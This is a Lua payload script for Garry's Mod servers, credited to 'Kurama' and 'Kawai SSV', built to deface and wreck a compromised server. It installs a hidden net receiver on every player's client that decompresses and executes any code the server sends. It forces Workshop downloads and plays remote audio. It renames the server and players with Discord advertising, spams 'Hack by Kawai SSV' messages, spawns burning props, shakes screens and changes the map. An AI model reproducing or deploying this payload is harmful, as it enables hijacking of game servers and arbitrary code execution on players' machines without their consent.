-- Payload Created by Kurama

-- Visuel Beta Kawai SSV

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function RandomString(intMin, intMax)
local ret = ""
    for _ = 1, math.random(intMin, intMax) do
    ret = ret .. string.char(math.random(65, 90))
end
    return ret
end
local randomtable = {
    Mainnet = RandomString(0, 69),
    Terosapasse = RandomString(0, 69),
    EXROR_ = RandomString(0, 69),
    FamosoKurama = RandomString(0, 69)
    }
util.AddNetworkString(randomtable["Terosapasse"])
util.AddNetworkString(randomtable["Mainnet"])
BroadcastLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme", function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        ply:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
    end
end)

m_strImageGlobalVar = RandomString( 6, 12 )
local function FamosoKuramaClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(randomtable["Mainnet"])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
for k, v in pairs(player.GetAll()) do
    v:SendLua("steamworks.FileInfo(2017072330,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
    v:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
end

timer.Simple(2.5, function()
    for k, v in pairs(player.GetAll()) do
    v:SendLua([[RunConsoleCommand("gmod_language", "fr")]])
end
    RunConsoleCommand("hostname", "Serveur en cours de Destruction by Kawai SSV -) discord.gg/lesheitan")
    RunConsoleCommand("ulx", "god", "*")
    RunConsoleCommand("sv_alltalk", "1")
    PrecacheParticleSystem("lesheitan")
end)

timer.Simple(5, function()
FamosoKuramaClient([[net.Receive("]] .. randomtable["Terosapasse"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
FamosoKuramaClient([[
    for i = 1, 10 do
    ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
end
timer.Simple(5, function()
timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
    notification.AddLegacy( "Teru Mikami", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
    notification.AddLegacy( "Kurama", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
        notification.AddLegacy( "TheCedoux", math.random(0, 4), 1.5 )
    end)
end)

timer.Simple(1, function()
    function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
    function GAMEMODE:PreDrawSkyBox()
local col = Color( 0, 0, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
        return !!1
    end
end)
]])

FamosoKuramaClient([[
local sheitan = {}
    hook.Add("HUDPaint", "]] .. RandomString(0, 69) .. [[",function()
        for k,v in pairs(sheitan) do
        v()
    end
end)

sheitan["CoolEffect"] = function()
local mats = Entity(0):GetMaterials()
    for k,v in pairs(mats) do
local wallahjerage = Color( 68, 68, 68)
        Material(v):SetVector("$color", Vector(wallahjerage))
        Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
    end
end
]])

FamosoKuramaClient([[
local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2
local defaultfov = LocalPlayer():GetFOV()
local override = 70
local sent = false
local audio
local skys = ents.FindByClass("env_skypaint")
local function AudioVizualier()
    if not audio then return end
local tbl = {}
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local vv = Vector(col.r / 255, col.g / 255, col.b / 255)
    audio:FFT(tbl, FFT_4096)
local avg = 0
    for i = 1, 40 do
    avg = avg + tbl[i]
end
local h = CurTime() * 250 % 360
    prevVal = Lerp(30 * FrameTime(), prevVal, avg)
        if prevVal > 2 then
    util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
local vPos = LocalPlayer():EyePos()
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add( "sprites/glow04_noz", vPos )
    if ( particle ) then
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(1)
    particle:SetStartAlpha(0)
    particle:SetEndAlpha(255)
    particle:SetStartSize(50)
    particle:SetEndSize(0)
    particle:SetStartLength(55)
    particle:SetEndLength(0)
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,0))
    particle:SetAirResistance(5)
    particle:SetCollide(true)
    particle:SetBounce(0.9)
end
    override = Lerp(10 * FrameTime(), override, prevVal * .875)
    else
    override = Lerp(5 * FrameTime(), override, defaultfov)
    sent = false
end
local vPos = LocalPlayer():EyePos() + Vector(0, 0, -5)
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add("particle/particle_smokegrenade", vPos)
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(2)
    particle:SetStartAlpha(math.Rand(1,10))
    particle:SetStartSize(1900)
    particle:SetEndSize(math.Rand(80,90))
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,100))
    particle:SetAirResistance(500)
local mats = Entity(0):GetMaterials()
    for k,v in pairs(mats) do
        Material(v):SetVector("$color", vv)
    end
end
    hook.Add("Think","]] .. RandomString(0, 69) .. [[",function()
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local v = Vector(col.r / 255, col.g / 255, col.b / 255)
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
    v:SetColor( col )
    v:Activate()
end
    for k,p in pairs(player.GetAll()) do
    p:SetColor( col )
    end
end)

local chair = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    chair:SetNoDraw(true)
local data = {}
local function genChair(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-1000,pos.x+1000),math.random(pos.y-1000,pos.y+1000),pos.z + math.random(800,1000) ), math.random(10, 70) }
end
    for i=1, 70 do
    genChair(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
    chair:SetPos(data[i][1])
    chair:SetupBones()
    chair:DrawModel()
    data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
            genChair(i)
        end
    end
end)

sound.PlayURL("https://lesheitan.fr/songs/EverythingBlack_AMV.mp3", "noblock", function(s)
    if not IsValid(s) then return end
        audio = s
    s:SetVolume( 15 )
    s:EnableLooping( false )
end)

hook.Add("HUDPaint", "]] .. randomtable["EXROR_"] .. [[", AudioVizualier)
hook.Add("CalcView", "]] .. randomtable["EXROR_"] .. [[", function(ply, origin, angles, fov, znear, zfar)
    return {
    ["origin"] = origin,
    ["angles"] = angles,
    ["fov"] = override,
    ["znear"] = znear,
    ["zfar"] = zfar
    }
end)

local function stop()
    audio = nil
    hook.Remove("HUDPaint", "]] .. randomtable["EXROR_"] .. [[")
    hook.Remove("HUDShouldDraw", "]] .. randomtable["EXROR_"] .. [[")
    hook.Remove("CalcView", "]] .. randomtable["EXROR_"] .. [[") 
    for k, v in pairs(oldhooks) do
    hook.Add("HUDPaint", k, v)
        oldhooks[k] = nil
    end
end
concommand.Add("lelstop", stop)
    if s == 1 then 
timer.Create("]] .. RandomString(0, 69) .. [[", 0.2, 0, function()
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)
end
]])
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    end
end)

timer.Simple(5, function()
FamosoKuramaClient([[  
timer.Create("]] .. randomtable["FamosoKurama"] .. [[", 1.5, 0, function()
local time = tonumber(0)
local Message = {
    "< Hack by Kawai SSV >",
    "<< Hack by Kawai SSV >>",
    "<<< Hack by Kawai SSV >>>",
    "<<<< Hack by Kawai SSV >>>>",
    "<<<<< Hack by Kawai SSV >>>>>",
    "<<<<<< Hack by Kawai SSV >>>>>>",
    "<<<<<<< Hack by Kawai SSV >>>>>>>",
    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
    "<<<<<<<<< Hack by Kawai SSV >>>>>>>>>",
    "<<<<<<<< Hack by Kawai SSV >>>>>>>>",
    "<<<<<<< Hack by Kawai SSV >>>>>>>",
    "<<<<<< Hack by Kawai SSV >>>>>>",
    "<<<<< Hack by Kawai SSV >>>>>",
    "<<<< Hack by Kawai SSV >>>>",
    "<<< Hack by Kawai SSV >>>",
    "<< Hack by Kawai SSV >>",
    "< Hack by Kawai SSV >",
    }
    for _, line in pairs(Message) do
    time = time + tonumber(0.1)
timer.Simple(time,function()
        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)
]])
end)

timer.Simple(5, function()
FamosoKuramaClient([[
timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
local sheitan = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    sheitan:SetNoDraw(true)
    sheitan:SetModelScale(50)
timer.Create("TuEsEnSueur", 0.01, 0, function()
    sheitan:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
end)

local data = {}
local function gensheitan(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
end
    for i=1, 50 do
    gensheitan(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
        sheitan:SetPos(data[i][1])
        sheitan:SetupBones()
        sheitan:DrawModel()
        data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
        gensheitan(i)
    end
end
    end)
end)
]])
end)

timer.Simple(5, function()
timer.Create("MonServeurEstPasBien", 0.50, 25, function()
    for k, v in pairs(player.GetAll()) do
local trace = v:GetEyeTraceNoCursor()
local car = ents.Create("prop_physics")
local trace2 = util.TraceLine({
    start = trace.HitPos,
    endpos = trace.HitPos + Vector(0, 0, 5000000),
    mask = MASK_SOLID_BRUSHONLY
    })
    car:SetModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
    car:SetAngles(v:GetAngles())
    car:SetPos(trace2.HitPos + Vector(0, 0, -60))
    car:Spawn()
    car:Activate()
    car.boom = 6
    car:GetPhysicsObject():SetVelocity(Vector(0, 0, -100))
    car:Ignite(500)
    car:AddCallback("PhysicsCollide", function(car, dat)
local ef = EffectData()
    ef:SetOrigin(car:GetPos())
    ef:SetMagnitude(5)
    ef:SetScale(200)
    util.Effect("ThumperDust", ef)
    car.boom = car.boom - 1
    if car.boom < 0 then
    car:Remove()
end
    end)
end
    end)
end)

timer.Simple( 5, function()
    RunConsoleCommand("sv_gravity", "200")
end)

timer.Create("OupsGM_Construct", 230, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create("SEIZED", 5, 0, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
    phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)

timer.Create("FamosoKuramaSeizedLeTrucQuiTeSertDeServeur", 5, 99, function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "Hack by Kawai SSV -) Join my Discord : discord.gg/kurama")
    end
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetRunSpeed(400 * 4)
        v:SetWalkSpeed(400 * 4)
    end
end)

timer.Create(RandomString(0, 69), 5.5, 1, function()
    for k, v in pairs(ents.FindByClass("prop_*")) do
local phys = v:GetPhysicsObject()
    if (IsValid(phys)) then
        phys:EnableMotion(true)
    end
end
local props = ents.GetAll()
    for _, prop in ipairs(props) do
        if (prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
        end
    end
end)